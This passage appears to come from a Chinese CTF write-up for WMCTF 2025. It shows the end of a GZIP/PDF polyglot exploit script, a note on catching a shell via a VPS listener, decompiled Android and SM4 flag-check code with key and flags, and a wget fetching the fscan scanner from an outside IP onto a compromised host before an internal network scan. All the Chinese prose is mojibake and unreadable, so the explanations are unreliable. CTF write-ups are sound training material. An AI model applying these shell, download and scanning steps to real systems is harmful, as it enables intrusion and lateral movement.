</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Header preview around %PDF-:&#34;</span><span class=p>,</span> <span class=n>gz_polyglot</span><span class=p>[</span><span class=n>idx</span><span class=p>:</span><span class=n>idx</span><span class=o>+</span><span class=mi>20</span><span class=p>]</span> <span class=k>if</span> <span class=n>idx</span> <span class=o>!=</span> <span class=o>-</span><span class=mi>1</span> <span class=k>else</span> <span class=kc>None</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;ç”Ÿæˆ polyglot: æœ‰æ•ˆGZIP(å¯è§£å‹å¾—åˆ°opcode) + å¤´éƒ¨æºå¸¦æœ‰æ•ˆPDF(å¯é€šè¿‡PDFè§£æ)&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>é¦–å…ˆä¸Šä¼ åŒ…å«æ¶æ„opcodeçš„gzæ–‡ä»¶, vpsç›‘å¬, å†ä¸Šä¼ æ¶æ„pdf, æ‹¿åˆ°shell</p><h1 id=reverse>Reverse</h1><h2 id=catfriend>catfriend</h2><p>å‡ºé¢˜äººå¤±è¯¯äº†ï¼Œæœç´¢å­—ç¬¦ä¸²ç›´æ¥æ‰¾åˆ°flag</p><p><img src=/img/2025-WMCTF/3.png alt=img></p><p>WMCTF{5a3e8f2b-1c7d-4a6f-b89e-0d3c2f1a4b5c}</p><h2 id=appfriend>appfriend</h2><p>Javaå±‚é€»è¾‘æŒ‡å‘nativeå±‚çš„check flagå‡½æ•°</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Java data-lang=Java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>com.example.yellow</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>android.os.Bundle</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>android.view.View</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>android.view.ViewGroup</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>android.widget.Button</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>android.widget.EditText</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>android.widget.TextView</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>androidx.constraintlayout.widget.ConstraintLayout</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>androidx.emoji2.text.d</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>b0.C0098a</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>b0.e</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.google.android.material.datepicker.k</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>e.AbstractActivityC0115h</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>e.C0114g</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>MainActivity</span><span class=w> </span><span class=kd>extends</span><span class=w> </span><span class=n>AbstractActivityC0115h</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>EditText</span><span class=w> </span><span class=n>f1494x</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>static</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>loadLibrary</span><span class=p>(</span><span class=s>&#34;yellow&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=nf>MainActivity</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>((</span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>f818e</span><span class=p>.</span><span class=na>f832c</span><span class=p>).</span><span class=na>e</span><span class=p>(</span><span class=s>&#34;androidx:appcompat&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>C0098a</span><span class=p>(</span><span class=k>this</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>h</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>C0114g</span><span class=p>(</span><span class=k>this</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>native</span><span class=w> </span><span class=kt>boolean</span><span class=w> </span><span class=nf>checkflag</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>str</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@Override</span><span class=w> </span><span class=c1>// e.AbstractActivityC0115h, androidx.activity.k, x.f, android.app.Activity</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>onCreate</span><span class=p>(</span><span class=n>Bundle</span><span class=w> </span><span class=n>bundle</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>super</span><span class=p>.</span><span class=na>onCreate</span><span class=p>(</span><span class=n>bundle</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>View</span><span class=w> </span><span class=n>inflate</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getLayoutInflater</span><span class=p>().</span><span class=na>inflate</span><span class=p>(</span><span class=n>R</span><span class=p>.</span><span class=na>layout</span><span class=p>.</span><span class=na>activity_main</span><span class=p>,</span><span class=w> </span><span class=p>(</span><span class=n>ViewGroup</span><span class=p>)</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=kc>false</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>i2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>R</span><span class=p>.</span><span class=na>id</span><span class=p>.</span><span class=na>button</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(((</span><span class=n>Button</span><span class=p>)</span><span class=w> </span><span class=n>d</span><span class=p>.</span><span class=na>j</span><span class=p>(</span><span class=n>inflate</span><span class=p>,</span><span class=w> </span><span class=n>R</span><span class=p>.</span><span class=na>id</span><span class=p>.</span><span class=na>button</span><span class=p>))</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(((</span><span class=n>EditText</span><span class=p>)</span><span class=w> </span><span class=n>d</span><span class=p>.</span><span class=na>j</span><span class=p>(</span><span class=n>inflate</span><span class=p>,</span><span class=w> </span><span class=n>R</span><span class=p>.</span><span class=na>id</span><span class=p>.</span><span class=na>editText</span><span class=p>))</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>i2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>R</span><span class=p>.</span><span class=na>id</span><span class=p>.</span><span class=na>editText</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>if</span><span class=w> </span><span class=p>(((</span><span class=n>TextView</span><span class=p>)</span><span class=w> </span><span class=n>d</span><span class=p>.</span><span class=na>j</span><span class=p>(</span><span class=n>inflate</span><span class=p>,</span><span class=w> </span><span class=n>R</span><span class=p>.</span><span class=na>id</span><span class=p>.</span><span class=na>sample_text</span><span class=p>))</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>setContentView</span><span class=p>((</span><span class=n>ConstraintLayout</span><span class=p>)</span><span class=w> </span><span class=n>inflate</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=k>this</span><span class=p>.</span><span class=na>f1494x</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>EditText</span><span class=p>)</span><span class=w> </span><span class=n>findViewById</span><span class=p>(</span><span class=n>R</span><span class=p>.</span><span class=na>id</span><span class=p>.</span><span class=na>editText</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=p>((</span><span class=n>Button</span><span class=p>)</span><span class=w> </span><span class=n>findViewById</span><span class=p>(</span><span class=n>R</span><span class=p>.</span><span class=na>id</span><span class=p>.</span><span class=na>button</span><span class=p>)).</span><span class=na>setOnClickListener</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>k</span><span class=p>(</span><span class=n>2</span><span class=p>,</span><span class=w> </span><span class=k>this</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=k>return</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>i2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>R</span><span class=p>.</span><span class=na>id</span><span class=p>.</span><span class=na>sample_text</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>NullPointerException</span><span class=p>(</span><span class=s>&#34;Missing required view with ID: &#34;</span><span class=p>.</span><span class=na>concat</span><span class=p>(</span><span class=n>inflate</span><span class=p>.</span><span class=na>getResources</span><span class=p>().</span><span class=na>getResourceName</span><span class=p>(</span><span class=n>i2</span><span class=p>)));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>nativeå±‚æ˜¯æ ‡å‡†çš„SM4åŠ å¯†</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=kt>bool</span> <span class=kr>__fastcall</span> <span class=nf>Java_com_example_yellow_MainActivity_checkflag</span><span class=p>(</span><span class=kr>__int64</span> <span class=n>a1</span><span class=p>,</span> <span class=kr>__int64</span> <span class=n>a2</span><span class=p>,</span> <span class=kr>__int64</span> <span class=n>a3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>s</span><span class=p>;</span> <span class=c1>// x22
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>n</span><span class=p>;</span> <span class=c1>// w24
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kr>__int8</span> <span class=o>*</span><span class=n>v7</span><span class=p>;</span> <span class=c1>// x25
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=n>n_1</span><span class=p>;</span> <span class=c1>// x26
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kr>__int8</span> <span class=o>*</span><span class=n>s_1</span><span class=p>;</span> <span class=c1>// x0
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v10</span><span class=p>;</span> <span class=c1>// w8
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>c</span><span class=p>;</span> <span class=c1>// w1
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v12</span><span class=p>;</span> <span class=c1>// w24
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=n>v13</span><span class=p>;</span> <span class=c1>// x8
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>_BOOL4</span> <span class=n>v14</span><span class=p>;</span> <span class=c1>// w24
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=n>n47</span><span class=p>;</span> <span class=c1>// x11
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=n>n0x2E</span><span class=p>;</span> <span class=c1>// x10
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>bool</span> <span class=n>v17</span><span class=p>;</span> <span class=c1>// zf
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=n>dest_</span><span class=p>;</span> <span class=c1>// [xsp+0h] [xbp-130h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>_DWORD</span> <span class=n>v20</span><span class=p>[</span><span class=mi>66</span><span class=p>];</span> <span class=c1>// [xsp+8h] [xbp-128h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>__int128</span> <span class=n>v21</span><span class=p>;</span> <span class=c1>// [xsp+110h] [xbp-20h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=n>v22</span><span class=p>;</span> <span class=c1>// [xsp+120h] [xbp-10h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>v22</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=n>_QWORD</span> <span class=o>*</span><span class=p>)(</span><span class=n>_ReadStatusReg</span><span class=p>(</span><span class=n>TPIDR_EL0</span><span class=p>)</span> <span class=o>+</span> <span class=mi>40</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>s</span> <span class=o>=</span> <span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=p>)(</span><span class=o>*</span><span class=p>(</span><span class=kr>__int64</span> <span class=p>(</span><span class=kr>__fastcall</span> <span class=o>**</span><span class=p>)(</span><span class=kr>__int64</span><span class=p>,</span> <span class=kr>__int64</span><span class=p>,</span> <span class=n>_QWORD</span><span class=p>))(</span><span class=o>*</span><span class=p>(</span><span class=n>_QWORD</span> <span class=o>*</span><span class=p>)</span><span class=n>a1</span> <span class=o>+</span> <span class=mi>1352LL</span><span class=p>))(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a3</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>n</span> <span class=o>=</span> <span class=n>strlen</span><span class=p>(</span><span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>v21</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=n>_OWORD</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>byte_ADC</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v7</span> <span class=o>=</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kr>__int8</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>v20</span><span class=p>[</span><span class=o>-</span><span class=mi>2</span><span class=p>]</span> <span class=o>-</span> <span class=p>(((</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)(</span><span class=n>n</span> <span class=o>+</span> <span class=mi>16</span><span class=p>)</span> <span class=o>+</span> <span class=mi>15LL</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0x1FFFFFFF0LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>n_1</span> <span class=o>=</span> <span class=n>n</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>memcpy</span><span class=p>(</span><span class=o>&amp;</span><span class=n>dest_</span><span class=p>,</span> <span class=n>s</span><span class=p>,</span> <span class=n>n</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>s_1</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>v7</span><span class=p>[</span><span class=n>n</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>n</span> <span class=o>&lt;=</span> <span class=mi>0</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>v10</span> <span class=o>=</span> <span class=o>-</span><span class=p>(</span><span class=o>-</span><span class=n>n</span> <span class=o>&amp;</span> <span class=mh>0xF</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span>
</span></span><span class=line><span class=cl>    <span class=n>v10</span> <span class=o>=</span> <span class=n>n</span> <span class=o>&amp;</span> <span class=mh>0xF</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>c</span> <span class=o>=</span> <span class=mi>16</span> <span class=o>-</span> <span class=n>v10</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v12</span> <span class=o>=</span> <span class=mi>16</span> <span class=o>-</span> <span class=n>v10</span> <span class=o>+</span> <span class=n>n</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v13</span> <span class=o>=</span> <span class=n>v12</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>n_1</span> <span class=o>+</span> <span class=mi>1</span> <span class=o>&gt;</span> <span class=n>v12</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>v13</span> <span class=o>=</span> <span class=n>n_1</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>memset</span><span class=p>(</span><span class=n>s_1</span><span class=p>,</span> <span class=n>c</span><span class=p>,</span> <span class=n>v13</span> <span class=o>-</span> <span class=n>n_1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>sm4_setkey_enc</span><span class=p>(</span><span class=n>v20</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>sm4_crypt_ecb</span><span class=p>(</span><span class=n>v20</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=n>v12</span><span class=p>,</span> <span class=n>v7</span><span class=p>,</span> <span class=n>v7</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>v14</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=o>*</span><span class=n>v7</span> <span class=o>==</span> <span class=mi>219</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>n47</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>do</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>n0x2E</span> <span class=o>=</span> <span class=n>n47</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span> <span class=n>n47</span> <span class=o>==</span> <span class=mi>47</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=n>v17</span> <span class=o>=</span> <span class=n>v7</span><span class=p>[</span><span class=n>n47</span> <span class=o>+</span> <span class=mi>1</span><span class=p>]</span> <span class=o>==</span> <span class=n>byte_AEC</span><span class=p>[</span><span class=n>n47</span> <span class=o>+</span> <span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>      <span class=o>++</span><span class=n>n47</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>(</span> <span class=n>v17</span> <span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>v14</span> <span class=o>=</span> <span class=n>n0x2E</span> <span class=o>&gt;</span> <span class=mh>0x2E</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=kt>void</span> <span class=p>(</span><span class=kr>__fastcall</span> <span class=o>**</span><span class=p>)(</span><span class=kr>__int64</span><span class=p>,</span> <span class=kr>__int64</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=p>))(</span><span class=o>*</span><span class=p>(</span><span class=n>_QWORD</span> <span class=o>*</span><span class=p>)</span><span class=n>a1</span> <span class=o>+</span> <span class=mi>1360LL</span><span class=p>))(</span><span class=n>a1</span><span class=p>,</span> <span class=n>a3</span><span class=p>,</span> <span class=n>s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>v14</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>å¯†æ–‡ï¼šDBE98E0AD47ED658741CD38EF85959858177D9F3A8F90F24CFE14FD11A313B72002A8A4EFA863CCAD024AC0300BB40D2</p><p>keyï¼š0123456789ABCDEFFEDCBA9876543210</p><p>æ‰¾åˆ°å¯†æ–‡å’Œkeyæ³¨æ„ç«¯åºèµ›åšå¨å­ç›´æ¥è§£å‡ºflag</p><p><img src=/img/2025-WMCTF/4.png alt=img></p><p>WMCTF{sm4_1s_1imsss_test_easyss}</p><h1 id=misc>Misc</h1><h2 id=check-in>Check in</h2><p>æ‰‹é€Ÿå±€ï¼ŒäºŒè¡€</p><h2 id=questionnaire>Questionnaire</h2><p>æ‰‹é€Ÿå±€ï¼ŒäºŒè¡€</p><h2 id=shopping-company1>Shopping company1</h2><p><img src=/img/2025-WMCTF/5.png alt=img></p><p>ç›´æ¥vshellä¸Šçº¿</p><h2 id=shopping-company3>Shopping company3</h2><p>ä¼ ä¸ªfscanä¸Šå»ï¼Œå‘ç°æœ‰ä¸¤ä¸ªç½‘æ®µ</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>wget</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>154.36.152.109</span><span class=p>:</span><span class=mi>9999</span><span class=o>/</span><span class=n>fscan</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ifconfig</span>
</span></span></code></pre></td></tr></table></div></div><p>å¯¹äº172çš„ç½‘æ®µè¿›è¡Œæ‰«æï¼Œç»“æœå¦‚ä¸‹</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>root</span><span class=nd>@ff7bf03fb11e</span><span class=p>:</span><span class=o>/</span><span class=n>tmp</span><span class=c1># ./fscan -h 172.20.0.20/24</span>
</span></span><span class=line><span class=cl><span class=err>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span>
</span></span><span class=line><span class=cl><span class=err>â”‚</span>    <span class=n>___</span>                              <span class=n>_</span>        <span class=err>â”‚</span>
</span></span><span class=line><span class=cl><span class=err>â”‚</span>   <span class=o>/</span> <span class=n>_</span> \     <span class=n>___</span>  <span class=n>___</span> <span class=n>_</span> <span class=n>__</span> <span class=n>__</span> <span class=n>_</span>  <span class=n>___</span><span class=o>|</span> <span class=o>|</span> <span class=n>__</span>    <span class=err>â”‚</span>
</span></span><span class=line><span class=cl><span class=err>â”‚</span>  <span class=o>/</span> <span class=o>/</span><span class=n>_</span>\<span class=o>/</span><span class=n>____</span><span class=o>/</span> <span class=n>__</span><span class=o>|/</span> <span class=n>__</span><span class=o>|</span> <span class=s1>&#39;__/ _` |/ __| |/ /    â”‚</span>
